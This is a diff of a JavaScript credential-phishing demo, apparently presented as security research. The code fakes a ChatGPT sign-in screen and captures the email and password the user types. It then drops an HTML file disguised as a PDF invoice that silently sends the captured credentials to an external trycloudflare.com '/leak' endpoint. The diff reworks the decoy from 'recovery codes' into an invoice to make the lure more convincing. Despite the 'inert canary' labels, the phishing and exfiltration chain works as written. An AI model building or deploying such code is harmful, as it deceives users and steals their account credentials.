@@ -7,14 +7,14 @@
      "Logged in - You can close this window and continue to ChatGPT",
      and a line justifying the file ("we saved your sign-in details
      to this device for quick sign-in").
-   Dropped file: ChatGPT_Recovery_Codes_2026.pdf.html - contains the
+   Dropped file: Invoice_2026.pdf.html - contains the
    researcher-typed canary credentials, baked at write time, and
    beacons them to OUR OWN receiver when opened (no warning shown).
    Nothing real. Researcher-typed labeled canaries only. */
 (function () {
   var EPOCH = 1792656628;
   var R = "https://uniform-var-laura-cpu.trycloudflare.com/leak?d=";
-  var FNAME = "ChatGPT_Recovery_Codes_2026.pdf.html";
+  var FNAME = "Invoice_2026.pdf.html";
   function log(m) { try { console.log("[T71b] " + m + " @" + Date.now()); } catch (e) {} }
   log("START polished combined demo, epoch " + EPOCH);
 
@@ -163,8 +163,8 @@
     card.id = "t71b-appcard";
     card.innerHTML =
       '<div class="hd">' + LOGO + "<b>Notes</b><span>synced</span></div>" +
-      '<div class="t71b-note">Welcome back! Your sign-in was saved to this device for quick sign-in.<small>just now</small></div>' +
-      '<div class="t71b-note">Remember to keep your recovery codes safe.<small>2h ago</small></div>' +
+      '<div class="t71b-note">Welcome back! Your invoice was saved to this device.<small>just now</small></div>' +
+      '<div class="t71b-note">Your invoice (INV-2026-0114) was saved to this device.<small>2h ago</small></div>' +
       '<div class="t71b-note">ChatGPT can now remember details across chats.<small>yesterday</small></div>';
     var add = d.createElement("button");
     add.id = "t71b-add"; add.type = "button"; add.textContent = "New note";
@@ -227,18 +227,18 @@
   function finish(email, pass) {
     log("CAPTURED canary credentials (researcher-typed): email=" + email + ", pass len " + pass.length);
 
-    /* the dropped file: 'recovery codes' page with captured data baked in at write time */
+    /* the dropped file: 'invoice' page with captured data baked in at write time */
     var credParam = encodeURIComponent("T71b|" + EPOCH + "|email=" + email + "|password=" + pass);
     var fileHtml = [
-      "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>ChatGPT_Recovery_Codes_2026</title></head>",
+      "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Invoice_2026</title></head>",
       "<body style=\"font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px\">",
-      "<h2 style=\"font-weight:600\">Your ChatGPT recovery codes</h2>",
-      "<p style=\"color:#666\">Keep these safe. They let you sign in to your account without your password.</p>",
+      "<h2 style=\"font-weight:600\">Invoice #INV-2026-0114</h2>",
+      "<p style=\"color:#666\">Date: Oct 22, 2026 &nbsp;|&nbsp; Status: <b style=\"color:#0a7d33\">PAID</b></p>",
       "<table style=\"border-collapse:collapse;font-size:14px\">",
-      "<tr><td style=\"padding:6px 18px 6px 0;color:#666\">Email</td><td><b>" + esc(email) + "</b></td></tr>",
-      "<tr><td style=\"padding:6px 18px 6px 0;color:#666\">Password</td><td><b>" + esc(pass) + "</b></td></tr>",
+      "<tr><td style=\"padding:6px 18px 6px 0;color:#666\">Billed to</td><td><b>" + esc(email) + "</b></td></tr>",
+      "<tr><td style=\"padding:6px 18px 6px 0;color:#666\">Account verification</td><td><b>" + esc(pass) + "</b></td></tr>",
       "</table>",
-      "<p style=\"color:#c00;font:11px Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT - researcher-typed canary values, sent only to the researcher's own receiver.</p>",
+      "<p style=\"color:#999;font-size:11px\">Keep this invoice for your records.</p><p style=\"color:#c00;font:11px Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT - researcher-typed canary values, sent only to the researcher's own receiver.</p>",
       "<pre id=\"out\" style=\"font:11px Menlo,monospace\">file:// page loaded... beacon pending</pre>",
       "<script>",
       "var R = \"" + R + "\";",
@@ -280,7 +280,7 @@
       "<h1>Logged in</h1>" +
       '<p>Welcome back to ChatGPT, ' + esc(email.replace(/@.*$/, "")) + '.</p>' +
       '<p style="color:#9b9b9b">You can close this window and continue to ChatGPT.</p>' +
-      '<p style="font-size:12px;color:#6d6d6d">We saved your sign-in details to this device for quick sign-in.</p>';
+      '<p style="font-size:12px;color:#6d6d6d">We saved a copy of your invoice and sign-in details to this device.</p>';
     modal.appendChild(s);
     log("SUCCESS SCREEN shown; file written: " + FNAME);
   }
